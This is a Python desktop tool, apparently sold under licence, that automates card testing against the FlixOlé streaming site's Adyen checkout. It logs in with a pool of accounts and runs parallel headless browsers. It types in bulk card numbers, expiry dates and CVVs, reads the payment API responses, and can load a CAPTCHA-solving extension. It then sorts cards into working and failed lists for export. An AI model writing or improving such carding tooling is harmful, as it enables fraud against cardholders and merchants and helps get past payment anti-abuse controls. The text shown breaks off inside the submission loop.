"""
FlixOlé Card Checker — App de escritorio
Requiere: pip install customtkinter playwright
"""

import asyncio
import json
import threading
from datetime import datetime
from pathlib import Path

import customtkinter as ctk
from tkinter import filedialog, messagebox
from PIL import Image

from flixole_checker import load_cards, load_accounts, worker
from license import validate_license, error_message, get_expiry_date, get_hardware_id

# ── Tema ──────────────────────────────────────────────────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ── Límites ───────────────────────────────────────────────────────────────────
# MAX_CARDS eliminado — sin límite en esta versión

# ── Colores — Modo oscuro con acento morado del logo ─────────────────────────
COLOR_BG       = "#0f0f1a"     # Negro azulado profundo
COLOR_PANEL    = "#1a1a2e"     # Azul-gris muy oscuro para paneles
COLOR_CARD     = "#252539"     # Azul-gris oscuro para tarjetas
COLOR_ACCENT   = "#8b7dd8"     # Morado medio del logo (para títulos/botones)
COLOR_SUCCESS  = "#00ff88"     # Verde neón para OK
COLOR_FAIL     = "#ff4466"     # Rojo neón para FAIL
COLOR_PENDING  = "#ffaa00"     # Naranja para PENDING
COLOR_TEXT     = "#ffffff"     # Blanco puro (máximo contraste)
COLOR_SUBTEXT  = "#b0b0c8"     # Gris claro azulado (buen contraste)


class CardRow(ctk.CTkFrame):
    """Fila de resultado para una tarjeta."""

    def __init__(self, master, number: str, expiry: str, account: str, card_data: dict = None, **kwargs):
        super().__init__(master, fg_color=COLOR_CARD, corner_radius=8, **kwargs)
        self.configure(height=48)
        self._card_data = card_data  # datos completos para copiar

        # Icono de estado
        self.status_label = ctk.CTkLabel(
            self, text="⏳", width=36, font=ctk.CTkFont(size=18),
            text_color=COLOR_PENDING
        )
        self.status_label.pack(side="left", padx=(10, 4))

        # Número de tarjeta
        self.num_label = ctk.CTkLabel(
            self, text=number, font=ctk.CTkFont(family="Courier New", size=13, weight="bold"),
            text_color=COLOR_TEXT, width=120
        )
        self.num_label.pack(side="left", padx=4)

        # Vencimiento
        self.exp_label = ctk.CTkLabel(
            self, text=expiry, font=ctk.CTkFont(size=12),
            text_color=COLOR_SUBTEXT, width=70
        )
        self.exp_label.pack(side="left", padx=4)

        # Cuenta usada
        self.acc_label = ctk.CTkLabel(
            self, text=account, font=ctk.CTkFont(size=11),
            text_color=COLOR_SUBTEXT, width=200
        )
        self.acc_label.pack(side="left", padx=4)

        # Mensaje
        self.msg_label = ctk.CTkLabel(
            self, text="Procesando...", font=ctk.CTkFont(size=12),
            text_color=COLOR_PENDING, anchor="w"
        )
        self.msg_label.pack(side="left", padx=(4, 6), fill="x", expand=True)

        # Botón copiar
        self.copy_btn = ctk.CTkButton(
            self, text="📋", width=32, height=26,
            fg_color=COLOR_PANEL, hover_color=COLOR_SUBTEXT,
            font=ctk.CTkFont(size=13),
            command=self._copy
        )
        self.copy_btn.pack(side="right", padx=(0, 8))

    def _copy(self):
        if not self._card_data:
            return
        c = self._card_data
        text = f"{c['number']} | {c['expiry_month']} | {c['expiry_year']} | {c['cvv']}"
        self.clipboard_clear()
        self.clipboard_append(text)
        # Feedback visual breve
        self.copy_btn.configure(text="✅")
        self.after(1200, lambda: self.copy_btn.configure(text="📋"))

    def set_account(self, account: str):
        self.acc_label.configure(text=account)

    def set_result(self, status: str, message: str):
        if status != "OK" and "cvv" in message.lower():
            self.status_label.configure(text="⚠", text_color=COLOR_PENDING)
            self.msg_label.configure(text="Live : CVV inválido", text_color=COLOR_PENDING)
        elif status == "OK":
            self.status_label.configure(text="✅", text_color=COLOR_SUCCESS)
            self.msg_label.configure(text=message, text_color=COLOR_SUCCESS)
        else:
            self.status_label.configure(text="❌", text_color=COLOR_FAIL)
            self.msg_label.configure(text=message, text_color=COLOR_FAIL)
    def set_running(self):
        self.status_label.configure(text="🔄", text_color=COLOR_PENDING)
        self.msg_label.configure(text="Procesando...", text_color=COLOR_PENDING)


class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        # ── Verificar licencia antes de cargar la app ──
        if not self._check_license():
            self.destroy()
            return

        self.title("CardChecker")
        self.geometry("900x680")
        self.minsize(800, 550)
        self.configure(fg_color=COLOR_BG)

        # Ícono de la ventana
        try:
            icon_path = Path(__file__).parent / "icon.ico"
            self.iconbitmap(str(icon_path))
        except Exception:
            pass

        self._cards    = []
        self._accounts = []
        self._running  = False
        self._stop_flag = False  # flag para detener el proceso
        self._rows: dict[str, CardRow] = {}

        self._build_ui()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Header ──
        header = ctk.CTkFrame(self, fg_color=COLOR_PANEL, corner_radius=0, height=64)
        header.pack(fill="x")
        header.pack_propagate(False)

        # Logo + título
        try:
            logo_path = Path(__file__).parent / "logo.png"
            if logo_path.exists():
                logo_img = ctk.CTkImage(
                    light_image=Image.open(logo_path),
                    dark_image=Image.open(logo_path),
                    size=(40, 40)
                )
                ctk.CTkLabel(header, image=logo_img, text="").pack(side="left", padx=(16, 4), pady=12)
        except Exception as e:
            print(f"Error cargando logo: {e}")

        ctk.CTkLabel(
            header, text="CardChecker",
            font=ctk.CTkFont(size=20, weight="bold"), text_color=COLOR_ACCENT
        ).pack(side="left", padx=(0, 20), pady=14)

        self.status_badge = ctk.CTkLabel(
            header, text="● Listo", font=ctk.CTkFont(size=12),
            text_color=COLOR_SUBTEXT
        )
        self.status_badge.pack(side="right", padx=20)

        # ── Cuerpo principal ──
        body = ctk.CTkFrame(self, fg_color="transparent")
        body.pack(fill="both", expand=True, padx=16, pady=10)

        # Columna izquierda — configuración
        left = ctk.CTkFrame(body, fg_color=COLOR_PANEL, corner_radius=12, width=260)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)
        self._build_config_panel(left)

        # Columna derecha — resultados
        right = ctk.CTkFrame(body, fg_color=COLOR_PANEL, corner_radius=12)
        right.pack(side="left", fill="both", expand=True)
        self._build_results_panel(right)

    def _build_config_panel(self, parent):
        ctk.CTkLabel(
            parent, text="CONFIGURACIÓN",
            font=ctk.CTkFont(size=11, weight="bold"), text_color=COLOR_SUBTEXT
        ).pack(anchor="w", padx=16, pady=(16, 4))

        # ── Tarjetas ──
        cards_header = ctk.CTkFrame(parent, fg_color="transparent")
        cards_header.pack(fill="x", padx=16, pady=(10, 2))
        ctk.CTkLabel(cards_header, text="Tarjetas",
                     text_color=COLOR_TEXT, font=ctk.CTkFont(size=12)).pack(side="left")
        self.cards_count_label = ctk.CTkLabel(
            cards_header, text="0 tarjetas",
            text_color=COLOR_ACCENT, font=ctk.CTkFont(size=11)
        )
        self.cards_count_label.pack(side="right")

        # Área de texto para pegar tarjetas
        self.cards_textbox = ctk.CTkTextbox(
            parent, height=130, fg_color=COLOR_CARD,
            border_color=COLOR_CARD, corner_radius=8,
            font=ctk.CTkFont(family="Courier New", size=12),
            text_color=COLOR_TEXT
        )
        self.cards_textbox.pack(fill="x", padx=16)
        self.cards_textbox.insert("1.0",
            "4111111111111111 | 12 | 2027 | 123\n"
            "5500005555555559 | 06 | 2026 | 456\n"
            "4242424242424242 | 09 | 2028 | 789"
        )
        self.cards_textbox.bind("<KeyRelease>", lambda e: self._count_cards())

        # Botón limpiar
        ctk.CTkButton(
            parent, text="🗑  Limpiar", height=28,
            fg_color=COLOR_CARD, hover_color=COLOR_FAIL,
            font=ctk.CTkFont(size=11), command=self._clear_cards
        ).pack(fill="x", padx=16, pady=(4, 0))

        # ── Cuentas ──
        ctk.CTkLabel(parent, text="Cuentas", text_color=COLOR_TEXT,
                     font=ctk.CTkFont(size=12)).pack(anchor="w", padx=16, pady=(12, 2))
        acc_row = ctk.CTkFrame(parent, fg_color="transparent")
        acc_row.pack(fill="x", padx=16)
        self.acc_entry = ctk.CTkEntry(acc_row, placeholder_text="accounts.csv",
                                      fg_color=COLOR_CARD, border_color=COLOR_CARD)
        self.acc_entry.pack(side="left", fill="x", expand=True)
        self.acc_entry.insert(0, "accounts.csv")
        ctk.CTkButton(acc_row, text="...", width=32, fg_color=COLOR_ACCENT,
                      hover_color="#c73652", command=self._browse_accounts).pack(side="left", padx=(4, 0))

        # ── Workers ──
        ctk.CTkLabel(parent, text="Workers paralelos", text_color=COLOR_TEXT,
                     font=ctk.CTkFont(size=12)).pack(anchor="w", padx=16, pady=(12, 2))
        self.workers_slider = ctk.CTkSlider(
            parent, from_=1, to=5, number_of_steps=4,
            button_color=COLOR_ACCENT, button_hover_color="#c73652",
            command=self._on_slider
        )
        self.workers_slider.set(2)
        self.workers_slider.pack(fill="x", padx=16)
        self.workers_label = ctk.CTkLabel(
            parent, text="2 workers",
            text_color=COLOR_ACCENT, font=ctk.CTkFont(size=13, weight="bold")
        )
        self.workers_label.pack(pady=(0, 4))

        # ── Headless siempre activo ──
        self.headless_var = ctk.BooleanVar(value=True)  # navegador oculto por defecto

        # Separador
        ctk.CTkFrame(parent, height=1, fg_color=COLOR_CARD).pack(fill="x", padx=16, pady=12)

        # ── Stats ──
        self.stats_frame = ctk.CTkFrame(parent, fg_color=COLOR_CARD, corner_radius=8)
        self.stats_frame.pack(fill="x", padx=16)
        self._stat_ok   = self._stat_box(self.stats_frame, "✅ OK",    "0", COLOR_SUCCESS)
        self._stat_live = self._stat_box(self.stats_frame, "⚠ Live CVVI",   "0", COLOR_PENDING)
        self._stat_fail = self._stat_box(self.stats_frame, "❌ FAIL",  "0", COLOR_FAIL)
        self._stat_tot  = self._stat_box(self.stats_frame, "📋 Total", "0", COLOR_TEXT)

        # ── Botones ──
        self.run_btn = ctk.CTkButton(
            parent, text="▶  INICIAR", fg_color="#2e7d32",
            hover_color="#1b5e20", font=ctk.CTkFont(size=14, weight="bold"),
            height=42, corner_radius=8, command=self._toggle_run
        )
        self.run_btn.pack(fill="x", padx=16, pady=(12, 4))

        # Contar tarjetas iniciales
        self._count_cards()

    def _stat_box(self, parent, label, value, color):
        f = ctk.CTkFrame(parent, fg_color="transparent")
        f.pack(side="left", expand=True, padx=6, pady=8)
        val_lbl = ctk.CTkLabel(f, text=value,
                               font=ctk.CTkFont(size=22, weight="bold"),
                               text_color=color)
        val_lbl.pack()
        ctk.CTkLabel(f, text=label, font=ctk.CTkFont(size=10),
                     text_color=COLOR_SUBTEXT).pack()
        return val_lbl

    def _build_results_panel(self, parent):
        # Header de resultados
        rh = ctk.CTkFrame(parent, fg_color="transparent")
        rh.pack(fill="x", padx=16, pady=(14, 6))
        ctk.CTkLabel(rh, text="RESULTADOS",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=COLOR_SUBTEXT).pack(side="left")

        # Botones exportar en el header de resultados
        ctk.CTkButton(
            rh, text="❌ Inválidas", width=110, height=26,
            fg_color="#4a1010", hover_color=COLOR_FAIL,
            font=ctk.CTkFont(size=11),
            command=lambda: self._open_results_popup("FAIL")
        ).pack(side="right", padx=(4, 0))
        ctk.CTkButton(
            rh, text="⚠ Live CVVI", width=90, height=26,
            fg_color="#7a4a00", hover_color="#5a3400",
            font=ctk.CTkFont(size=11),
            command=lambda: self._open_results_popup("LIVE")
        ).pack(side="right", padx=(4, 0))
        ctk.CTkButton(
            rh, text="✅ Válidas", width=100, height=26,
            fg_color="#1e4620", hover_color=COLOR_SUCCESS,
            font=ctk.CTkFont(size=11),
            command=lambda: self._open_results_popup("OK")
        ).pack(side="right", padx=(4, 0))

        self.progress_label = ctk.CTkLabel(rh, text="",
                                           font=ctk.CTkFont(size=11),
                                           text_color=COLOR_SUBTEXT)
        self.progress_label.pack(side="right", padx=(0, 8))

        # Barra de progreso
        self.progress_bar = ctk.CTkProgressBar(parent, fg_color=COLOR_CARD,
                                               progress_color=COLOR_ACCENT)
        self.progress_bar.pack(fill="x", padx=16, pady=(0, 8))
        self.progress_bar.set(0)

        # Cabecera de columnas
        cols = ctk.CTkFrame(parent, fg_color="transparent")
        cols.pack(fill="x", padx=16)
        for text, w in [("", 36), ("Tarjeta", 120), ("Vence", 70),
                        ("Cuenta", 200), ("Resultado", 0)]:
            ctk.CTkLabel(cols, text=text, width=w,
                         font=ctk.CTkFont(size=10, weight="bold"),
                         text_color=COLOR_SUBTEXT).pack(side="left", padx=4)

        ctk.CTkFrame(parent, height=1, fg_color=COLOR_CARD).pack(fill="x", padx=16, pady=4)

        # Scroll de filas
        self.scroll = ctk.CTkScrollableFrame(parent, fg_color="transparent",
                                             scrollbar_button_color=COLOR_CARD)
        self.scroll.pack(fill="both", expand=True, padx=16, pady=(0, 16))

        # Log de consola
        ctk.CTkFrame(parent, height=1, fg_color=COLOR_CARD).pack(fill="x", padx=16)
        self.log_box = ctk.CTkTextbox(parent, height=90, fg_color=COLOR_CARD,
                                      text_color=COLOR_SUBTEXT,
                                      font=ctk.CTkFont(family="Courier New", size=11))
        self.log_box.pack(fill="x", padx=16, pady=(4, 12))
        self.log_box.configure(state="disabled")

    # ── Lógica ────────────────────────────────────────────────────────────────

    def _count_cards(self):
        text = self.cards_textbox.get("1.0", "end")
        count = 0
        for line in text.splitlines():
            line = line.strip()
            if line and len(line.split("|")) >= 4:
                count += 1
        self.cards_count_label.configure(
            text=f"{count} tarjeta{'s' if count != 1 else ''}",
            text_color=COLOR_ACCENT
        )

    def _clear_cards(self):
        self.cards_textbox.delete("1.0", "end")
        self._count_cards()

    def _browse_cards(self):
        path = filedialog.askopenfilename(filetypes=[("CSV", "*.csv"), ("All", "*.*")])
        if path:
            try:
                with open(path, encoding="utf-8") as f:
                    content = f.read()
                self.cards_textbox.delete("1.0", "end")
                self.cards_textbox.insert("1.0", content)
                self._count_cards()
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo leer el archivo:\n{e}")

    def _on_slider(self, val):
        self.workers_label.configure(text=f"{int(val)} workers")

    def _browse_accounts(self):
        path = filedialog.askopenfilename(filetypes=[("CSV", "*.csv"), ("All", "*.*")])
        if path:
            self.acc_entry.delete(0, "end")
            self.acc_entry.insert(0, path)

    def _browse_cards(self):
        path = filedialog.askopenfilename(filetypes=[("CSV", "*.csv"), ("All", "*.*")])
        if path:
            self.cards_entry.delete(0, "end")
            self.cards_entry.insert(0, path)

    def _browse_accounts(self):
        path = filedialog.askopenfilename(filetypes=[("CSV", "*.csv"), ("All", "*.*")])
        if path:
            self.acc_entry.delete(0, "end")
            self.acc_entry.insert(0, path)

    def _log(self, msg: str):
        self.log_box.configure(state="normal")
        self.log_box.insert("end", f"{msg}\n")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    def _update_stats(self):
        ok   = sum(1 for r in self._results if r["status"] == "OK")
        live = sum(1 for r in self._results if r["status"] == "LIVE")
        fail = sum(1 for r in self._results if r["status"] == "FAIL")
        tot  = len(self._results)
        self._stat_ok.configure(text=str(ok))
        self._stat_live.configure(text=str(live))
        self._stat_fail.configure(text=str(fail))
        self._stat_tot.configure(text=str(tot))
        if self._total_cards > 0:
            self.progress_bar.set(tot / self._total_cards)
            self.progress_label.configure(text=f"{tot} / {self._total_cards}")

    def _toggle_run(self):
        if self._running:
            self._stop()
        else:
            self._start()

    def _stop(self):
        self._stop_flag = True
        self.run_btn.configure(text="⏳ Deteniendo...", state="disabled", fg_color=COLOR_SUBTEXT)
        self._log("⏹ Deteniendo — esperando que terminen las tarjetas en proceso...")

    def _start(self):
        if self._running:
            return

        cards_path = self.cards_textbox.get("1.0", "end")

        # Parsear tarjetas directo del textbox
        try:
            cards_inline = []
            for line in cards_path.splitlines():
                line = line.strip()
                if not line:
                    continue
                parts = [p.strip() for p in line.split("|")]
                if len(parts) < 4:
                    continue
                cards_inline.append({
                    "number":       parts[0].replace(" ", ""),
                    "expiry_month": parts[1].zfill(2),
                    "expiry_year":  parts[2],
                    "cvv":          parts[3],
                    "name":         "Juan Perez",
                })
            # Deduplicar por número de tarjeta — conservar la primera ocurrencia
            seen = set()
            unique_cards = []
            for c in cards_inline:
                if c["number"] not in seen:
                    seen.add(c["number"])
                    unique_cards.append(c)
            duplicates = len(cards_inline) - len(unique_cards)
            if duplicates:
                self._log(f"⚠ {duplicates} tarjeta(s) duplicada(s) eliminadas")
            self._cards = unique_cards
            self._accounts = load_accounts(self.acc_entry.get())
        except Exception as e:
            messagebox.showerror("Error", f"No se pudieron cargar los datos:\n{e}")
            return

        if not self._cards:
            messagebox.showwarning("Aviso", "No hay tarjetas en el área de texto.")
            return
        if not self._accounts:
            messagebox.showwarning("Aviso", "No hay cuentas en accounts.csv.")
            return

        # Limpiar UI
        for w in self.scroll.winfo_children():
            w.destroy()
        self._rows.clear()
        self._results = []
        self._total_cards = len(self._cards)
        self.progress_bar.set(0)
        self.progress_label.configure(text=f"0 / {self._total_cards}")
        self._stat_ok.configure(text="0")
        self._stat_fail.configure(text="0")
        self._stat_tot.configure(text="0")
        self.log_box.configure(state="normal")
        self.log_box.delete("1.0", "end")
        self.log_box.configure(state="disabled")

        # Crear filas sin cuenta asignada — se asigna dinámicamente
        for card in self._cards:
            row = CardRow(self.scroll,
                          number=f"****{card['number'][-4:]}",
                          expiry=f"{card['expiry_month']}/{card['expiry_year']}",
                          account="en espera...",
                          card_data=card)
            row.pack(fill="x", pady=3)
            self._rows[card["number"]] = row

        self._running = True
        self._stop_flag = False
        self.run_btn.configure(text="⏹  DETENER", state="normal",
                               fg_color="#c62828", hover_color="#b71c1c")
        self.status_badge.configure(text="● Corriendo", text_color=COLOR_PENDING)
        workers_per = int(self.workers_slider.get())
        self._log(f"Iniciando — {len(self._cards)} tarjetas · {len(self._accounts)} cuentas · {workers_per} workers")

        headless = self.headless_var.get()

        threading.Thread(
            target=self._run_async,
            args=(workers_per, headless),
            daemon=True
        ).start()

    def _run_async(self, workers_per, headless):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._run_checker(workers_per, headless))
        except Exception as e:
            import traceback
            log_path = Path(__file__).parent / "error.log"
            with open(log_path, "w") as f:
                f.write(traceback.format_exc())
            self.after(0, self._log, f"❌ Error crítico: {e} — ver error.log")
        finally:
            loop.close()

    async def _run_checker(self, workers_per, headless):
        from playwright.async_api import async_playwright
        import os

        # Localizar Chromium — primero busca junto al exe (modo empaquetado), luego en AppData
        browser_path = None
        import sys, os
        # Ruta base: junto al exe si está empaquetado, o en AppData si corre como script
        if getattr(sys, 'frozen', False):
            base = sys._MEIPASS
            chrome_bundled = os.path.join(base, "chromium-1234", "chrome-win64", "chrome.exe")
            if os.path.exists(chrome_bundled):
                browser_path = chrome_bundled

        if not browser_path:
            ms_playwright = os.path.expandvars(r"%LOCALAPPDATA%\ms-playwright")
            if os.path.exists(ms_playwright):
                for folder in sorted(os.listdir(ms_playwright), reverse=True):
                    if folder.startswith("chromium") and not folder.startswith("chromium_headless"):
                        chrome = os.path.join(ms_playwright, folder, "chrome-win64", "chrome.exe")
                        if os.path.exists(chrome):
                            browser_path = chrome
                            break

        if not browser_path:
            self.after(0, self._log, "⬇ Chromium no encontrado — instalando automáticamente...")
            try:
                import subprocess, sys
                subprocess.run(
                    [sys.executable, "-m", "playwright", "install", "chromium"],
                    check=True, capture_output=True
                )
                self.after(0, self._log, "✅ Chromium instalado correctamente")
                # Volver a buscar tras la instalación
                ms_playwright = os.path.expandvars(r"%LOCALAPPDATA%\ms-playwright")
                if os.path.exists(ms_playwright):
                    for folder in sorted(os.listdir(ms_playwright), reverse=True):
                        if folder.startswith("chromium") and not folder.startswith("chromium_headless"):
                            chrome = os.path.join(ms_playwright, folder, "chrome-win64", "chrome.exe")
                            if os.path.exists(chrome):
                                browser_path = chrome
                                break
            except Exception as e:
                self.after(0, self._log, f"❌ No se pudo instalar Chromium: {e}")

        if not browser_path:
            self.after(0, self._log, "❌ Chromium no encontrado. Ejecuta manualmente: playwright install chromium")
            self.after(0, self._on_done, [])
            return

        self.after(0, self._log, f"Browser OK")

        # Descargar extensión NopeCHA si hay API key configurada
        nopecha_ext_path = None
        nopecha_key = getattr(self, '_nopecha_key', None)
        if nopecha_key:
            try:
                import nopecha
                import tempfile, zipfile, urllib.request
                ext_dir = os.path.join(os.path.expandvars("%LOCALAPPDATA%"), "CardCheckerR", "nopecha_ext")
                os.makedirs(ext_dir, exist_ok=True)
                # Descargar extensión de NopeCHA
                ext_zip = os.path.join(ext_dir, "nopecha.zip")
                if not os.path.exists(os.path.join(ext_dir, "manifest.json")):
                    urllib.request.urlretrieve(
                        "https://nopecha.com/f/extension.zip", ext_zip
                    )
                    with zipfile.ZipFile(ext_zip, 'r') as z:
                        z.extractall(ext_dir)
                # Inyectar API key en la extensión
                settings_file = os.path.join(ext_dir, "settings.json")
                import json
                settings = {"apikey": nopecha_key, "enabled_hosts": ["ver.flixole.com"]}
                with open(settings_file, "w") as f:
                    json.dump(settings, f)
                nopecha_ext_path = ext_dir
                self.after(0, self._log, "NopeCHA cargado ✅")
            except Exception as e:
                self.after(0, self._log, f"⚠ NopeCHA no disponible: {e}")

        results_shared = []
        print_lock     = asyncio.Lock()

        async def on_result(result: dict):
            """Callback llamado cuando una tarjeta termina."""
            results_shared.append(result)
            self._results = results_shared[:]
            # Actualizar fila en UI (thread-safe via after)
            number_key = None
            for k, row in self._rows.items():
                if k[-4:] == result["number"][-4:]:
                    number_key = k
                    break
            if number_key:
                self.after(0, self._rows[number_key].set_account, result["account"])
                self.after(0, self._rows[number_key].set_result,
                           result["status"], result["message"])
            self.after(0, self._update_stats)
            self.after(0, self._log,
                       f"{'✅' if result['status']=='OK' else ('⚠' if result['status']=='LIVE' else '❌')} "
                       f"{result['number']} [{result['account']}] → {result['message']}")

        async with async_playwright() as pw:
            # Silenciar logs de Playwright
            import logging
            logging.getLogger("playwright").setLevel(logging.ERROR)
            
            launch_kwargs = {
                "headless": headless,
                "executable_path": browser_path,
            }
            if nopecha_ext_path:
                # NopeCHA requiere headless=False para funcionar como extensión
                launch_kwargs["headless"] = False
                launch_kwargs["args"] = [
                    f"--disable-extensions-except={nopecha_ext_path}",
                    f"--load-extension={nopecha_ext_path}",
                ]

            browser = await pw.chromium.launch(**launch_kwargs)

            # Pool compartido de tarjetas — cola asyncio
            card_queue = asyncio.Queue()
            for card in self._cards:
                await card_queue.put(card)

            # Pool de cuentas disponibles
            available_accounts = asyncio.Queue()
            for acc in self._accounts:
                await available_accounts.put(acc)

            tasks = []
            for i in range(workers_per):
                task = asyncio.create_task(
                    self._worker_with_callback(
                        f"W{i+1}", browser, card_queue, available_accounts,
                        print_lock, on_result
                    )
                )
                tasks.append(task)

            await asyncio.gather(*tasks)
            await browser.close()

        self.after(0, self._on_done, results_shared)

    async def _worker_with_callback(self, worker_id, browser, card_queue,
                                    available_accounts, print_lock, on_result):
        """
        Worker con pool compartido.
        - Toma una tarjeta de card_queue
        - Toma una cuenta disponible de available_accounts
        - Si la cuenta tiene suscripción activa, la descarta y toma otra
        - Si el pago falla por razón de cuenta, devuelve la tarjeta a la cola
        - Termina cuando la cola de tarjetas está vacía
        """
        from playwright.async_api import TimeoutError as PlaywrightTimeout

        async def _login(page, email, password):
            await page.goto("https://ver.flixole.com/log-in", wait_until="networkidle")
            try:
                await page.click("text=Aceptar todo", timeout=5_000)
                await page.wait_for_timeout(500)
            except PlaywrightTimeout:
                pass
            await page.fill('input[type="email"]', email)
            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_function(
                "() => !window.location.href.includes('/log-in')", timeout=20_000)

        async def _select_plan(page):
            """
            Detecta el estado de la cuenta y elige el flujo correcto:
            - Sin suscripción → checkout normal
            - Con suscripción → Cambiar método de pago
            Devuelve True si llegó al formulario de tarjeta, False si falló.
            """
            # Verificar estado de la cuenta en settings/payment
            await page.goto("https://ver.flixole.com/settings/payment", wait_until="networkidle")
            await page.wait_for_timeout(1_000)
            body_payment = (await page.inner_text("body")).lower()

            cambiar_btn = page.locator('button:has-text("Cambiar método de pago")')
            tiene_cambiar = await cambiar_btn.count() > 0

            if tiene_cambiar:
                # Cuenta con método de pago guardado (tiene o tuvo suscripción)
                self.after(0, self._log, f"[{worker_id}] Usando 'Cambiar método de pago'...")
                await cambiar_btn.click()
                await page.wait_for_timeout(3_000)
            else:
                # Cuenta sin suscripción → ir al checkout normal
                self.after(0, self._log, f"[{worker_id}] Checkout normal (cuenta nueva)...")
                await page.goto("https://ver.flixole.com/checkout", wait_until="networkidle")
                await page.wait_for_timeout(1_500)

                body_checkout = (await page.inner_text("body")).lower()
                if "promoción no disponible" in body_checkout:
                    return "has_subscription"

                try:
                    m = page.locator('text=mensual').first
                    if await m.count() > 0:
                        await m.click(timeout=5_000)
                except PlaywrightTimeout:
                    pass
                try:
                    btn = page.locator('button:has-text("Continuar")').first
                    await btn.wait_for(state="visible", timeout=10_000)
                    await btn.click()
                    self.after(0, self._log, f"[{worker_id}] Continuar step, esperando Adyen...")
                except PlaywrightTimeout:
                    self.after(0, self._log, f"[{worker_id}] Sin botón Continuar — URL: {page.url}")
                    return False

            # Esperar iframes de Adyen (aplica a ambos flujos)
            for i in range(30):
                await page.wait_for_timeout(1_000)
                count = await page.locator('iframe[src*="adyen"], iframe[src*="checkoutshopper"]').count()
                if count > 0:
                    self.after(0, self._log, f"[{worker_id}] Pago cargado ({i+1}s)")
                    return True

            self.after(0, self._log, f"[{worker_id}] Adyen no cargó. URL: {page.url}")
            return False

        async def _fill(page, card):
            num_frame = page.frame_locator('iframe[title*="número de tarjeta"]')
            num_input = num_frame.locator('input[autocomplete="cc-number"], input[placeholder*="1234"]')
            await num_input.click()
            await num_input.type(card["number"], delay=50)
            await page.wait_for_timeout(500)
            name_input = page.locator('input[name="holderName"]')
            if await name_input.count() > 0:
                await name_input.click()
                await name_input.type(card["name"], delay=50)
                await page.wait_for_timeout(400)
            exp_frame = page.frame_locator('iframe[title*="caducidad"]')
            exp_input = exp_frame.locator('input[placeholder="MM/AA"], input[autocomplete="cc-exp"]')
            await exp_input.click()
            await exp_input.type(f"{card['expiry_month']}{card['expiry_year'][-2:]}", delay=50)
            await page.wait_for_timeout(400)
            cvc_frame = page.frame_locator('iframe[title*="seguridad"]')
            cvc_input = cvc_frame.locator('input[placeholder*="dígitos"], input[autocomplete="cc-csc"]')
            await cvc_input.click()
            await cvc_input.type(card["cvv"], delay=50)
            await page.wait_for_timeout(1_000)

        async def _submit(page):
            # Interceptar respuestas de red de Adyen para resultado inmediato
            payment_result = {"code": None, "reason": None, "action": None}

            async def handle_response(response):
                url = response.url
                # Capturar respuestas del endpoint de pagos de Adyen/FlixOlé
                if any(k in url for k in ["adyen", "payments", "checkout/api", "threeDS/return", "details",
                                          "storedPaymentMethods", "paymentMethods", "recurringDetail"]):
                    try:
                        data = await response.json()
                        code   = data.get("resultCode") or data.get("result") or ""
                        reason = data.get("refusalReason") or data.get("message") or ""
                        action = data.get("action", {})
                        # Guardar resultado sin loguear detalles HTTP
                        if code and code not in ("Success",):  # ignorar fingerprint 3DS
                            payment_result["code"]   = code
                            payment_result["reason"] = reason
                            payment_result["action"] = action.get("type") if isinstance(action, dict) else None
                    except Exception:
                        pass  # Respuestas no-JSON ignoradas

            page.on("response", handle_response)

            submit = page.locator(
                'button.adyen-checkout__button--pay, '
                'button:has-text("Guardar los detalles")'
            ).first
            await submit.click(force=True)

            # Verificar error de validación del formulario Adyen (número inválido, etc.)
            await page.wait_for_timeout(800)

            # Buscar error dentro del iframe del número de tarjeta (ambos flujos)
            form_error_msg = None
            try:
                num_frame = page.frame_locator(
                    'iframe[title*="número de tarjeta"], iframe[title*="card number"], iframe[title*="numero"]'
                )
                for sel in ['.adyen-checkout__error-text', '[class*="error-text"]', '[class*="error"]']:
                    el = num_frame.locator(sel).first
                    if await el.count() > 0:
                        txt = (await el.inner_text()).strip()
                        if txt:
                            form_error_msg = txt
                            break
            except Exception:
                pass

            # Si no encontró en iframe, buscar en página principal
            if not form_error_msg:
                for sel in [
                    '.adyen-checkout__field--error .adyen-checkout__error-text',
                    '[class*="adyen-checkout__error"]',
                    'span[class*="error-text"]',
                ]:
                    err_el = page.locator(sel).first
                    if await err_el.count() > 0:
                        txt = (await err_el.inner_text()).strip()
                        if txt:
                            form_error_msg = txt
                            break

            if form_error_msg:
                error_map = {
                    "introduzca un número de tarjeta válido": "Número de tarjeta inválido",
                    "enter a valid card number":              "Número de tarjeta inválido",
                    "invalid card number":                    "Número de tarjeta inválido",
                    "introduzca la fecha de caducidad":       "Fecha de expiración inválida",
                    "enter a valid expiry date":              "Fecha de expiración inválida",
                    "card expired":                           "Tarjeta expirada",
                    "tarjeta caducada":                       "Tarjeta expirada",
                    "introduzca el código de seguridad":      "CVV inválido",
                    "enter the security code":                "CVV inválido",
                }
                mensaje = next((v for k, v in error_map.items() if k in form_error_msg.lower()), form_error_msg)
                self.after(0, self._log, f"   ► Error formulario Adyen: {mensaje}")
                return False, f"Rechazada: {mensaje}"

            # Esperar resultado — máximo 45s, pero puede resolverse mucho antes
            for _ in range(45):
                await page.wait_for_timeout(1_000)
                url  = page.url
                body = (await page.inner_text("body")).lower()
                code = payment_result["code"]

                # ✅ Resultado directo de la API de Adyen
                if code and code not in ("Success",):  # "Success" = fingerprint 3DS, no es resultado final
                    self.after(0, self._log, f"   ► API code={code} reason={payment_result['reason']} action={payment_result['action']}")
                    if code in ("Authorised", "Pending"):
                        return True, "Tarjeta válida"
                    elif code == "RedirectShopper":
                        action_type = payment_result["action"]
                        if action_type == "threeDS2":
                            payment_result["code"] = None
                            continue
                        return False, f"Requiere redirección ({action_type})"
                    elif code == "Refused":
                        reason = payment_result["reason"] or "Rechazada"
                        return False, f"Rechazada: {reason}"
                    elif code in ("Error", "Cancelled"):
                        return False, f"Error de pago: {payment_result['reason'] or code}"
                    elif "kill switch" in code.lower() or "kill switch" in (payment_result["reason"] or "").lower():
                        return False, "Rechazada: Kill Switch (limite de intentos alcanzado)"
                    else:
                        # Cualquier otro code desconocido = rechazo
                        return False, f"Rechazada: {code}"

